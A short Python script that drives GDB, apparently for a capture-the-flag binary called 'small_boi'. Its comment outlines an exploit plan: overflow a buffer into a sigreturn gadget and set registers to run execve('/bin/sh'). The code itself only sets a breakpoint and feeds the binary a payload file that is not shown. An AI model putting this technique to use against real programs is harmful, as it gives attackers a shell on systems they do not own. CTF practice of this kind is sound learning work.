#!/usr/bin/python3

# Usage: gdb -q -x script.py
# pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git

#from pwn import * # Using for easy sigreturn frame
import gdb
import struct

"""
Strategy:
    Buffer overflow to sigreturn gadget @0x40017c
    Load all registers to execute syscall
        execve("/bin/sh", 0, 0)
"""

def main():
    #gdb.events.stop.connect(stop_handler)

    gdb.execute("file ./small_boi")
    gdb.execute("b * 0x4001ab")

    gdb.execute("r < exploit.txt")

if __name__ == "__main__":
    main()
